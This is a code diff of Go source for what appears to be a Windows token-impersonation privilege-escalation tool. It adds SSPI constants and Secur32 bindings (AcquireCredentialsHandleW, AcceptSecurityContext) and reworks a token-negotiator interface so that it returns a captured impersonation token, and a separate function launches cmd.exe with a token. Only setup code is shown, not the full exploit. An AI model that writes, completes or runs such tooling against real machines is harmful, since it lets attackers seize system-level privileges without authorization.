@@ -13,7 +13,12 @@ const (
 	SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryToken"
 	SE_INCREASE_QUOTE_NAME  = "SeIncreaseQuoteName"
 	SECPKG_CRED_INBOUND     = 0x00000001
+	SECBUFFER_VERSION       = 0x00000000
+	SECBUFFER_TOKEN         = 0x00000002
 	CREATE_NEW_CONSOLE      = 0x00000010
+	ASC_REQ_ALLOCATE_MEMORY = 0x00000100
+	ASC_REQ_CONNECTION      = 0x00000800
+	SECURITY_NATIVE_DREP    = 0x00000010
 	SecurityImpersonation   = 0x00000002
 	program                 = "C:\\Windows\\System32\\cmd.exe"
 	args                    = ""
@@ -26,13 +31,19 @@ var (
 	setSecurityDescriptorDacl    = advapi32DLL.NewProc("SetSecurityDescriptorDacl")
 	initializeSecurityDescriptor = advapi32DLL.NewProc("InitializeSecurityDescriptor")
 
-	secur32DLL               = syscall.NewLazyDLL("secur32.dll")
-	acquireCredentialsHandle = secur32DLL.NewProc("AcquireCredentialsHandle")
+	secur32DLL               = syscall.NewLazyDLL("Secur32.dll")
+	acquireCredentialsHandle = secur32DLL.NewProc("AcquireCredentialsHandleW")
+	acceptSecurityContext    = secur32DLL.NewProc("AcceptSecurityContext")
 )
 
 type ITokenNegotiator interface {
 	Trigger() bool
-	Serve() (*windows.Token, error)
+	Serve() NegotiatorResult
+}
+
+type NegotiatorResult struct {
+	ImpersonationToken *windows.Token
+	Error              error
 }
 
 func ExecuteWithToken(token windows.Token) error {
